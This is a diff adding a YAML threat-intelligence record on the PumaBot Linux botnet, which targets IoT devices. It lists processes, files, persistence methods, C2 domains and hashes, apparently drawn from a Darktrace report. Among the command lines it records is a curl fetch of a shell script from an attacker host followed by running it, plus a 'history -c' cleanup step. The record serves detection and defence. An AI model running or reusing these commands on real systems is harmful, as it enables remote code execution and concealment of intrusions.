@@ -1,0 +1,63 @@
+description: A PumaBot is a custom Go-based Linux botnet targeting embedded Linux
+  Internet of Things (IoT) devices. It brute-forces SSH credentials and establishes
+  persistence using system service files.
+attribution: Darktrace
+malware_families:
+- PumaBot
+- ddaemon
+authors:
+- tgould@cadosecurity.com
+TTPs:
+  processes:
+  - redis
+  - mysqI
+  - uname
+  - curl
+  - wget
+  - sshd
+  commandline:
+  - /lib/redis
+  - ExecStart=/lib/redis
+  - axmriga
+  - anetworkxma
+  - uname -a
+  - curl -0 http://1.lusyn.xyz/jc/jc.sh
+  - ./jc.sh
+  - history -c
+  powershell: ''
+  scripting_engine:
+  - bash
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: redis
+    destination_address: ssh[.]ddos-cc.org
+    port: 55554
+  - executable: ddaemon
+    destination_address: db[.]17kp.xyz
+  - executable: networkxm
+    destination_address: db[.]17kp.xyz
+  file_activity:
+  - /lib/redis
+  - /etc/systemd/system/redis.service
+  - /etc/systemd/system/mysqI.service
+  - /usr/src/bao/networkxm
+  - /usr/bin/con.txt
+  persistence:
+  - systemd service file creation (redis.service, mysqI.service)
+  - SSH key addition to users authorized_keys file
+  pipes: ''
+  process_relations: ''
+IOCs:
+- md5: cab6f908f4dedcdaedcdd07fdc0a8e38
+- md5: 48ee40c40fa320d5d5f8fc0359aa96f3
+- md5: be83729e943d8d0a35665f55358bdf88
+- md5: 1bd6bcd480463b6137179bc703f49545
+- ssh[.]ddos-cc.org:55554
+- db[.]17kp.xyz
+- 1[.]lusyn.xyz
+- dasfsdfsdfsdfasfgbczxxc[.]lusyn.xyz
+- X-API-KEY: jieruidashabi
+reference: https://www.darktrace.com/blog/pumabot-novel-botnet-targeting-iot-surveillance-devices
+date_of_publication: May 28, 2025
+file_creation_date: June 11, 2025
